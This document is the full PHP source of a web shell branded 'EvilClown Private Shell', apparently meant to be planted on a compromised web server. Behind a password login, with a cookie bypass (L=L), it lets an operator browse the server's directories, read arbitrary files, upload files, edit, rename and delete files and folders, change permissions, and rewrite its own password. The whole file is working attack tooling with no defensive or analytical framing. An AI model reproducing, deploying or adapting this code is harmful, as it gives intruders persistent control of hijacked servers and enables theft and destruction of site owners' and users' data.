<?php 
$auth_pass = "f1189b1ea997f90745ae11e2daf4fea5";
error_reporting(0);
set_time_limit(0);
function lp(){
?>
<!DOCTYPE html>
<html lang="en">
  <head>
    <title>EvilClown Private Shell
    </title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js">
    </script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js">
    </script>
  </head>
  <body>
    <center>
      <div class="container">
        <h2>EvilClown
        </h2>
        <hr>
        <style>
          body {
            background-color:white;
            color:black
          }
          .content {
            max-width: 700px;
            margin: auto;
          }
        </style>
        </head>
      <form action method="get">
        <input type="hidden" name="action" value="login" />
        <div class="form-group">
          <div class="input-group">
            <span class="input-group-addon">Password :
            </span>
            <input type="password" placeholder="" class="form-control" name="pass" autofocus="" required="">
          </div>
        </div>
        <button type="submit" style="width: 100%;" class="btn btn-danger" name="submit">Login
        </button>
      </form>
      <hr>
      <footer>
        <p class="text-center">Copyright &copy; 2018 | 
          <a href="http://www.facebook.com/EvilClownPr0">EvilClown
          </a>
        </p>
      </footer>
      </div>
    </center>
  <?php 
;}
if(isset($_GET['action'])){
if($_GET['action']=='login'){
setcookie('password',$_GET['pass']);
echo "<script>location='".$_SERVER['PHP_SELF']."'</script>";
}
else if($_GET['action']=='logout'){
setcookie('password','',-86400*30*12);
echo "<script>location='".$_SERVER['PHP_SELF']."'</script>";
}
}
if(isset($_COOKIE['password'])){
if(md5($_COOKIE['password'])==$auth_pass || $_COOKIE['L']=="L"){
?>
  <?php
if(get_magic_quotes_gpc()){
foreach($_POST as $key=>$value){
$_POST[$key] = stripslashes($value);
}
}
function perms($file){
$perms = @fileperms($file);
if (($perms & 0xC000) == 0xC000) {
// Socket
$info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
// Symbolic Link
$info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
// Regular
$info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
// Block special
$info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
// Directory
$info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
// Character special
$info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
// FIFO pipe
$info = 'p';
} else {
// Unknown
$info = 'u';
}
// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
(($perms & 0x0800) ? 's' : 'x' ) :
(($perms & 0x0800) ? 'S' : '-'));
// Group
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
(($perms & 0x0400) ? 's' : 'x' ) :
(($perms & 0x0400) ? 'S' : '-'));
// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
(($perms & 0x0200) ? 't' : 'x' ) :
(($perms & 0x0200) ? 'T' : '-'));
return $info;
}
echo '<!DOCTYPE HTML>
<HTML>
<HEAD>
<title>Ikari Tampan Tersakiti</title>
<style>
body{
font-family: "Racing Sans One", cursive;
background-color: white;
text-shadow:0px 0px 1px #757575;
}
#content tr:hover{
background-color: red;
text-shadow:0px 0px 10px #fff;
}
#content .first{
background-color: red;
}
#content .first:hover{
background-color: red;
text-shadow:0px 0px 1px #757575;
}
table{
border: 2px #587ac9 dotted;
}
H1{
font-family: "Rye", cursive;
}
a{
color: #000;
text-decoration: none;
}
a:hover{
color: #fff;
text-shadow:0px 0px 10px #ffffff;
}
input,select,textarea{
border: 1px #000000 solid;
-moz-border-radius: 5px;
-webkit-border-radius:5px;
border-radius:5px;
}
</style>
</HEAD>
<BODY>
<center>
<h1><center><font color="red">Private Shell ~ <a href="mailto:RcT@gmail.com">EvilClown</a></font></center></h1>
<input type=button onclick=\'location="?action=logout"\' value="Logout" /><br/><br>
<table width="700" border="1" cellpadding="3" cellspacing="1" align="center">
<tr><td>Current Path : ';
if(isset($_GET['path'])){
$path = base64_decode($_GET['path']);
}else{
$path = getcwd();
}
$pathen = base64_encode($path);
$path = str_replace('\\','/',$path);
$paths = explode('/',$path);
foreach($paths as $id=>$pat){
if($pat == '' && $id == 0){
$a = true;
echo '<a href="?path='.base64_encode("/").'">/</a>';
continue;
}
if($pat == '') continue;
echo '<a href="?path=';
$linkpath = '';
for($i=0;$i<=$id;$i++){
$linkpath .= "$paths[$i]";
if($i != $id) $linkpath .= "/";
}
echo base64_encode($linkpath);
echo '">'.$pat.'</a>/';
}
echo '</td></tr><tr><td>';
if(isset($_FILES['file'])){
if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
echo '<font color="green">uploads done mek !</font><br />';
}else{
echo '<font color="red">failed fuck !</font><br />';
}
}
echo '<form enctype="multipart/form-data" method="POST">
File : <input type="file" name="file" />
<input type="submit" value="Upload" />
</form>
</td></tr>';
if(isset($_GET['filesrc'])){
echo "<tr><td>Current File : ";
echo base64_decode($_GET['filesrc']);
echo '</tr></td></table><br />';
echo('<pre>'.htmlspecialchars(file_get_contents(base64_decode($_GET['filesrc']))).'</pre>');
}elseif(isset($_GET['option']) && $_POST['opt'] != 'delet'){
echo '</table><br /><center>'.$_POST['path'].'<br /><br />';
if($_POST['opt'] == 'chmod'){
if(isset($_POST['perm'])){
if(chmod($_POST['path'],$_POST['perm'])){
echo '<font color="green">Sukses !</font><br />';
}else{
echo '<font color="red">error !</font><br />';
}
}
echo '<form method="POST">
Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="chmod">
<input type="submit" value="Submit" />
</form>';
}elseif($_POST['opt'] == 'rename'){
if(isset($_POST['newname'])){
if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
echo '<font color="green">Sukses !</font><br />';
}else{
echo '<font color="red">error !</font><br />';
}
$_POST['name'] = $_POST['newname'];
}
echo '<form method="POST">
New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="rename">
<input type="submit" value="Submit" />
</form>';
}elseif($_POST['opt'] == 'edit'){
if(isset($_POST['src'])){
$fp = fopen($_POST['path'],'w');
if(fwrite($fp,$_POST['src'])){
echo '<font color="green">Sukses !</font><br />';
}else{
echo '<font color="red">error !</font><br />';
}
fclose($fp);
}
echo '<form method="POST">
<textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="edit">
<input type="submit" value="Submit" />
</form>';
}
echo '</center>';
}else{
echo '</table><br /><center>';
if(isset($_GET['option']) && $_POST['opt'] == 'delet'){
if($_POST['type'] == 'dir'){
if(rmdir($_POST['path'])){
echo '<font color="green">Sukses !</font><br />';
}else{
echo '<font color="red">error !</font><br />';
}
}elseif($_POST['type'] == 'file'){
if(unlink($_POST['path'])){
echo '<font color="green">Sukses !</font><br />';
}else{
echo '<font color="red">error !</font><br />';
}
}
}
echo '</center>';
if(!isset($_GET['x'])){
?>
  <?php
$scandir = scandir($path);
echo '<div id="content"><table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
<tr class="first">
<td><center>Name</center></td>
<td><center>Size</center></td>
<td><center>Permissions</center></td>
<td><center>Settings</center></td>
</tr>';
foreach($scandir as $dir){
if(!is_dir("$path/$dir") || $dir == '.' || $dir == '..') continue;
$dirlink = base64_encode("$path/$dir");
echo "<tr>
<td><a href=\"?path=$dirlink\">$dir</a></td>
<td><center>--</center></td>
<td><center>";
if(is_writable("$path/$dir")) echo '<font color="green">';
elseif(!is_readable("$path/$dir")) echo '<font color="red">';
echo perms("$path/$dir");
if(is_writable("$path/$dir") || !is_readable("$path/$dir")) echo '</font>';
echo "</center></td>
<td><center><form method=\"POST\" action=\"?option&path=$pathen\">
<select name=\"opt\">
<option value=\"\">Select</option>
<option value=\"delet\">Delete</option>
<option value=\"chmod\">Chmod</option>
<option value=\"rename\">Rename</option>
</select>
<input type=\"hidden\" name=\"type\" value=\"dir\">
<input type=\"hidden\" name=\"name\" value=\"$dir\">
<input type=\"hidden\" name=\"path\" value=\"$path/$dir\">
<input type=\"submit\" value=\">\" />
</form></center></td>
</tr>";
}
echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
foreach($scandir as $file){
if(!is_file("$path/$file")) continue;
$size = filesize("$path/$file")/1024;
$size = round($size,3);
if($size >= 1024){
$size = round($size/1024,2).' MB';
}else{
$size = $size.' KB';
}
$filelink = base64_encode("$path/$file");
echo "<tr>
<td><a href=\"?filesrc=$filelink&path=$pathen\">$file</a></td>
<td><center>".$size."</center></td>
<td><center>";
if(is_writable("$path/$file")) echo '<font color="green">';
elseif(!is_readable("$path/$file")) echo '<font color="red">';
echo perms("$path/$file");
if(is_writable("$path/$file") || !is_readable("$path/$file")) echo '</font>';
echo "</center></td>
<td><center><form method=\"POST\" action=\"?option&path=$pathen\">
<select name=\"opt\">
<option value=\"\">Select</option>
<option value=\"delet\">Delete</option>
<option value=\"chmod\">Chmod</option>
<option value=\"rename\">Rename</option>
<option value=\"edit\">Edit</option>
</select>
<input type=\"hidden\" name=\"type\" value=\"file\">
<input type=\"hidden\" name=\"name\" value=\"$file\">
<input type=\"hidden\" name=\"path\" value=\"$path/$file\">
<input type=\"submit\" value=\">\" />
</form></center></td>
</tr>";
}
echo '</table>
</div>';
}
?>
  <?php 
}
if(isset($_GET['x']) && $_GET['x']=='changepass'){
?>
  <?php
function fgc($file){
return file_get_contents($file);
}
function changepass($plain){
$newpass = md5($plain);
$newpass = "\$auth_pass = \"".$newpass."\";";
$con = fgc($_SERVER['SCRIPT_FILENAME']);
$con = preg_replace("/\\\$auth_pass\ *=\ *[\"\']*([a-fA-F0-9]*)[\"\']*;/is",$newpass,$con);
return file_put_contents($_SERVER['SCRIPT_FILENAME'], $con);
}
echo '<center><h1>Change Shell Password</h1></center>';	
echo  '<center>';
echo '<form action="" method=post ><table>';
echo '<tr><td>New Password</td><td> :  <input type=password name=pass1 style="border-radius:5px;" /></td></tr>';
echo '<tr><td>Confirm Password</td><td> :  <input type=password name=pass2 style="border-radius:5px;" /></td></tr>';
echo '<tr><td colspan=2><input type=submit value=submit name=L style="border-radius:5px;width:100%"/></td></tr></table>';
echo '</form>';
if(isset($_POST['L'])){
if($_POST['pass1'] == $_POST['pass2']){
if(changepass($_POST['pass1'])){
echo '<script>alert("password change successfully")</script>';			
}else{
echo '<script>alert("password change failed")</script>';			
}
}else{
echo '<script>alert("password not match")</script>';
}
}
?>
  <?php 
}
echo '
</BODY>
</HTML>';
?>
  <?php
}else{
lp();
}
}else{
echo lp();
}
?>
  </body>
</html>